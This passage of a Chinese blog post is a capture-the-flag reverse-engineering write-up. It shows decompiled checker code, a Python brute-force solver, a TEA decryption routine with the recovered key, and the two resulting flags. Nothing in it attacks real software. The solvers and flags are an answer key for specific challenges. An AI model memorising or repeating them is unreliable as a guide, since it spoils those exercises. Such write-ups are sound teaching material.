v9 = v8 - 87;</span><br><span class="line">    else</span><br><span class="line">      v9 = v8 - 48;</span><br><span class="line">    v10 = byte_402151[2 * v4];</span><br><span class="line">    v11 = 16 * v9;</span><br><span class="line">   <span class="built_in"> if </span>( v10 &lt; 48 || v10 &gt; 57 )</span><br><span class="line">      v12 = v10 - 87;</span><br><span class="line">    else</span><br><span class="line">      v12 = v10 - 48;</span><br><span class="line">   <span class="built_in"> if </span>( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) )</span><br><span class="line">      break;</span><br><span class="line">   <span class="built_in"> if </span>( ++v4 &gt;= 35 )</span><br><span class="line">     <span class="built_in"> return </span>1;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>-1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的解密脚本：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x1</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,<span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,<span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x4</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x9a</span>,<span class="number">0x7</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,<span class="number">0x9</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x0</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,<span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x2</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0xc</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0xb</span>,<span class="number">0xdb</span>,<span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0xa</span>,<span class="number">0x49</span>,<span class="number">0x6</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x8</span>,<span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,<span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x3</span>,<span class="number">0xf6</span>,<span class="number">0xe</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,<span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,<span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0xd</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0xf</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>]</span><br><span class="line">byte_402150 = <span class="string">"2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"</span></span><br><span class="line">byte_402151 = <span class="string">"a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"</span></span><br><span class="line">def my_de(<span class="number">ch</span>,index):</span><br><span class="line">	v5=<span class="number">ch</span></span><br><span class="line">	v6=(v5&gt;&gt;<span class="number">4</span>)<span class="subst">%16</span></span><br><span class="line">	v7 = (<span class="number">16</span>*v5&gt;&gt;<span class="number">4</span>)<span class="subst">%16</span></span><br><span class="line">	v8=ord(byte_402150[<span class="number">2</span>*index])</span><br><span class="line">	if v8&lt;<span class="number">48</span> <span class="keyword">or</span> v8&gt;<span class="number">57</span>:</span><br><span class="line">		v9=v8-<span class="number">87</span></span><br><span class="line"><span class="symbol">	else:</span></span><br><span class="line">		v9=v8-<span class="number">48</span></span><br><span class="line">	v10 = ord(byte_402151[<span class="number">2</span>*index])</span><br><span class="line">	v11 = v9*<span class="number">16</span></span><br><span class="line">	if v10&lt;<span class="number">48</span> <span class="keyword">or</span> v10 &gt;<span class="number">57</span>:</span><br><span class="line">		v12 = v10-<span class="number">87</span></span><br><span class="line"><span class="symbol">	else:</span></span><br><span class="line">		v12=v10-<span class="number">48</span></span><br><span class="line">	if data[<span class="number">16</span>*v6+v7]==(v11+v12)^<span class="number">0x19</span>:</span><br><span class="line">		return chr(<span class="number">ch</span>)</span><br><span class="line"><span class="symbol">	else:</span></span><br><span class="line">		return <span class="number">0</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">for y <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">	for x <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">		a = my_de(x,y)</span><br><span class="line">		if a!=<span class="number">0</span>:</span><br><span class="line">			flag+=a</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>

<h4 id="flag-flag-Th1s-1s-Simple-Rep1ac3-Enc0d3"><a href="#flag-flag-Th1s-1s-Simple-Rep1ac3-Enc0d3" class="headerlink" title="flag:flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}"></a>flag:flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</h4><h3 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h3><p>在main函数中通过”_”将输入的字符串进行分割，前6位限制必须是数字，md5加密后是“1f74648e50a6a6708ec54ab327a163d5536b7ced”，解密发现是122333</p>
<p>对后八位进行TEA加密，然后与正确字符串进行比较，key=“yeyeyess”</p>
<p>C语言解密代码：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    uint32_t delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    for (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    uint32_t delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    for (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[<span class="number">2</span>]=&#123;<span class="number">0x1CD6202D</span>,<span class="number">0x31792AC4</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">0x65796579</span>,<span class="number">0x73736579</span>,<span class="number">0xcccccccc</span>,<span class="number">0xcccccccc</span>&#125;;</span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="comment">// printf("加密前原始数据：%u %u\n",v[0],v[1]);</span></span><br><span class="line">    <span class="comment">// encrypt(v, k);</span></span><br><span class="line">    printf(<span class="string">"加密后的数据：%u %u<span class="subst">\n</span>"</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    printf(<span class="string">"解密后的数据：%x %x"</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于这个key我有点蒙圈，在内存中看是“0x65796579,0x73736579,0xcccccccc,0xcccccccc”，但是在代码中看的是“yeyeyess”，emmm</p>
<p>解密后得到：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  re ./en</span><br><span class="line">加密后的数据：<span class="number">483794989</span> <span class="number">830024388</span></span><br><span class="line">解密后的数据：<span class="number">676e6150</span> <span class="number">6e696</span>c6f</span><br><span class="line">➜  re</span><br></pre></td></tr></table></figure>

<p>可以16进制转字符串得到</p>
<h4 id="jactf-122333-Pangolin"><a href="#jactf-122333-Pangolin" class="headerlink" title="jactf{122333_Pangolin}"></a>jactf{122333_Pangolin}</h4>
        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
